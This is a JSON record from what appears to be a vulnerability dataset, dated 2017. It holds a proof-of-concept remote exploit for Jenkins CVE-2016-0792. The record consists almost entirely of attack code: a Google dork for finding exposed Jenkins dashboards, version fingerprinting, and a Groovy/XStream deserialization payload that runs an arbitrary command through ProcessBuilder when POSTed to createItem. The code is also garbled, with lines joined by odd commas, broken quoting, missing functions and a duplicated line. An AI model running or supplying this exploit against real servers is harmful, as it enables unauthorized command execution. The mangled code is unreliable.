{
    "text": "vul_name : Jenkins < 1.650 Java Deserialization ， vul_cve : CVE-2016-0792 ， vul_poc : import random ， from decimal import Decimal ， from requests.exceptions import RequestException ，  # Exploit Title : Jenkins CVE-2016-0792 Deserialization Remote Exploit ，  # Google Dork : intitle : \"Dashboard [ Jenkins ] \" + \"Manage Jenkins\" ，  # Date : 30-07-2017 ，  # Exploit Author : Janusz Piechwka ，  # Github :  ，  # Vendor Homepage :  ，  # Version : Versions before 1.650 and LTS before 1.642.2 ，  # Tested on : Debian ，  # CVE : CVE-2016-0792 ， splitCommand = command.split (  )  ， preparedCommands = ' ， preparedCommands += f'<string>{entry}</string>' ， xml = f' ， <map> ， <entry> ， <groovy.util.Expando> ， <expandoProperties> ， <entry> ， <string>hashCode</string> ， <org.codehaus.groovy.runtime.MethodClosure> ， <delegate class=\"groovy.util.Expando\"/> ， <owner class=\"java.lang.ProcessBuilder\"> ， <command>{preparedCommands}</command> ， </owner> ， <method>start</method> ， </org.codehaus.groovy.runtime.MethodClosure> ， </entry> ， </expandoProperties> ， </groovy.util.Expando> ， <int>1</int> ， </entry> ， </map>' ， print ( f' [  *  ] STARTING' )  ， print ( f' [ + ] Trying to exploit Jenkins running at address : {url}' )  ，  # Perform initial URL check to see if server is online and returns correct response code using HEAD request ， headResponse = requests.head ( url , timeout=30 )  ， print ( f' [ + ] Server online and responding | RESPONSE : {headResponse.status_code}' )  ，  # Check if X-Jenkins header containing version is present then proceed ， jenkinsVersionHeader = headResponse.headers.get ( 'X-Jenkins' )  ，  # Strip version after second dot from header to perform conversion to Decimal ， stripCharacter = \".\" ， strippedVersion = stripCharacter.join ( jenkinsVersionHeader.split ( stripCharacter )  [  : 2 ]  )  ，  # Perform basic version check ， print ( f' [ + ] Jenkins version : {Decimal ( strippedVersion ) } | VULNERABLE' )  ，  # Prepare payload ， payload = prepare_payload ( command )  ，  # Prepare POST url ， randomJobName = '.join ( random.SystemRandom (  ) .choice ( string.ascii_lowercase + string.digits ) for _ in range ( 8 )  ， postUrl = f'{url}createItem?name={randomJobName}' ， postUrl = f'{url}/createItem?name={randomJobName}' ， print ( f' [ + ] Will POST to {postUrl}' )  ，  # Try to execute passed command ， postResponse = requests.post ( postUrl , data=payload , headers={'Content-Type' : 'application/xml'} )  ， print ( f' [ + ] Exploit launched ' )  ，  # 500 response code is ok here",
    "time": "2017.07.31"
}